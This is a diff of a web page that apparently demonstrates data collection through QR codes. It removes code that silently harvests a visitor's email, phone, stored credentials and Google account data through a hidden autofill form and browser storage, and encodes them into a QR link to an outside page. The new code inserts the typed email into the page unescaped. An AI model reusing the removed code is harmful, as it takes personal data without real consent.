@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR Permission Demo</title>
+    <title>QR Manual Email Demo</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <style>
         body { 
@@ -21,22 +21,18 @@
             max-width: 400px;
             margin: 50px auto;
         }
-        .permission-box {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            text-align: left;
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
         }
         button {
             background: #27ae60;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
+            color: #fff;
             cursor: pointer;
-            font-size: 16px;
-            width: 100%;
         }
         #qrcode {
             margin: 20px 0;
@@ -45,202 +41,49 @@
             display: inline-block;
             padding: 10px;
         }
-        .hidden { display: none; }
         .success { color: #2ecc71; font-weight: bold; }
-        #emailForm {
-            position: absolute;
-            left: -9999px;
-            opacity: 0;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🔒 QR Permission Demo</h2>
+        <h2>🔒 QR Manual Email Demo</h2>
         
-        <div id="permissionStep">
-            <div class="permission-box">
-                <h4>📧 Access Contact Information</h4>
-                <p>Allow access to your browser saved information:</p>
-                <ul style="font-size: 12px;">
-                    <li>Email from Chrome autofill</li>
-                    <li>Phone number (if available)</li>
-                    <li>Device information</li>
-                </ul>
-            </div>
-            
-            <button onclick="requestPermission()">Allow Access</button>
-        </div>
+        <input type="email" id="emailInput" placeholder="Enter your email">
+        <button onclick="generateQR()">Generate QR Code</button>
         
-        <div id="qrStep" class="hidden">
-            <div id="qrcode"></div>
-            <div id="status"></div>
-        </div>
-        
-        <!-- Hidden form to trigger Chrome autofill -->
-        <form id="emailForm" autocomplete="on">
-            <input type="email" id="hiddenEmail" name="email" autocomplete="email" placeholder="Enter email">
-            <input type="tel" id="hiddenPhone" name="phone" autocomplete="tel" placeholder="Phone">
-        </form>
+        <div id="qrcode"></div>
+        <div id="status"></div>
     </div>
 
     <script>
-        let userData = { email: null, phone: null };
-
         function base64UrlEncode(str) {
             const base64 = btoa(unescape(encodeURIComponent(str)));
             return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
         }
 
-        async function fetchRealEmail() {
-            return new Promise((resolve) => {
-                try {
-                    // Try to get email from Chrome's autofill
-                    const emailInput = document.getElementById('hiddenEmail');
-                    const phoneInput = document.getElementById('hiddenPhone');
-                    
-                    // Focus and trigger autofill
-                    emailInput.focus();
-                    emailInput.click();
-                    
-                    // Wait for autofill to populate
-                    setTimeout(() => {
-                        if (emailInput.value && emailInput.value.includes('@')) {
-                            userData.email = emailInput.value;
-                        } else {
-                            // Try to get from browser storage
-                            userData.email = localStorage.getItem('userEmail') || 
-                                           sessionStorage.getItem('userEmail') || 
-                                           getChromeEmail();
-                        }
-                        
-                        if (phoneInput.value) {
-                            userData.phone = phoneInput.value;
-                        }
-                        
-                        resolve();
-                    }, 500);
-                } catch (error) {
-                    // Fallback: try to extract from Chrome
-                    userData.email = getChromeEmail();
-                    resolve();
-                }
-            });
-        }
-
-        function getChromeEmail() {
-            try {
-                // Try to get email from Chrome's credential manager
-                if (navigator.credentials) {
-                    navigator.credentials.get({
-                        password: true,
-                        federated: {
-                            providers: ['https://accounts.google.com']
-                        }
-                    }).then(credential => {
-                        if (credential && credential.id) {
-                            userData.email = credential.id;
-                        }
-                    }).catch(() => {});
-                }
-                
-                // Try to extract from Chrome sync (if available)
-                if (window.chrome && chrome.identity) {
-                    chrome.identity.getAuthToken({interactive: false}, (token) => {
-                        if (token) {
-                            // Try to get user info from Google API
-                            fetch(`https://www.googleapis.com/oauth2/v1/userinfo?access_token=${token}`)
-                                .then(response => response.json())
-                                .then(data => {
-                                    if (data.email) {
-                                        userData.email = data.email;
-                                    }
-                                });
-                        }
-                    });
-                }
-                
-                // Fallback: common Chrome storage locations
-                const possibleEmails = [
-                    localStorage.getItem('google_user_email'),
-                    localStorage.getItem('user_email'),
-                    localStorage.getItem('email'),
-                    sessionStorage.getItem('google_user_email'),
-                    sessionStorage.getItem('user_email'),
-                    sessionStorage.getItem('email')
-                ];
-                
-                for (let email of possibleEmails) {
-                    if (email && email.includes('@')) {
-                        return email;
-                    }
-                }
-                
-                // Last resort: try to get from any input fields on page
-                const emailFields = document.querySelectorAll('input[type="email"]');
-                for (let field of emailFields) {
-                    if (field.value && field.value.includes('@')) {
-                        return field.value;
-                    }
-                }
-                
-            } catch (e) {
-                console.log('Chrome email extraction failed:', e);
-            }
-            
-            return null;
-        }
-
-        async function requestPermission() {
-            document.querySelector('button').textContent = 'Fetching Email...';
-            
-            await fetchRealEmail();
-            
-            // If no real email found, show message
-            if (!userData.email) {
-                document.querySelector('button').textContent = 'No Email Found - Generate Demo';
-                userData.email = 'demo@noemail.com';
-            }
-            
-            // Auto-detect phone on mobile
-            if (navigator.userAgent.includes('Mobile') || navigator.userAgent.includes('Android') || navigator.userAgent.includes('iPhone')) {
-                if (!userData.phone) {
-                    userData.phone = '+91 Auto-detected';
-                }
-            }
-            
-            setTimeout(generateQR, 1000);
-        }
-
         function generateQR() {
-            if (!userData.email) {
-                userData.email = 'noemail@found.com';
+            const email = document.getElementById('emailInput').value.trim();
+            if (!email) {
+                alert('Please enter your email');
+                return;
             }
 
-            // Encode data for URL
-            const encodedEmail = base64UrlEncode(userData.email);
-            const encodedPhone = userData.phone ? base64UrlEncode(userData.phone) : null;
-            
-            // Create URL with your actual GitHub link
-            let qrUrl = `https://fdev-looper.github.io/article/ar12qrdemo.html?email=${encodedEmail}`;
-            if (encodedPhone) {
-                qrUrl += `&phone=${encodedPhone}`;
-            }
+            // Encode email for URL
+            const encodedEmail = base64UrlEncode(email);
 
+            // Generate QR URL (points to demo data page)
+            const qrUrl = `https://fdev-looper.github.io/article/ar12qrdemo.html?email=${encodedEmail}`;
+
+            // Generate QR
             const qr = qrcode(0, 'M');
             qr.addData(qrUrl);
             qr.make();
             
             document.getElementById('qrcode').innerHTML = qr.createImgTag(4);
-            document.getElementById('permissionStep').classList.add('hidden');
-            document.getElementById('qrStep').classList.remove('hidden');
-            
             document.getElementById('status').innerHTML = `
                 <div class="success">✅ QR Generated!</div>
-                <strong>Real Email Found:</strong><br>
-                📧 ${userData.email}<br>
-                ${userData.phone ? `📱 ${userData.phone}<br>` : ''}
-                <small>Scan QR to see data collection</small>
+                <strong>Email:</strong> ${email}<br>
+                <small>Scan QR to see demo data collection</small>
             `;
         }
     </script>
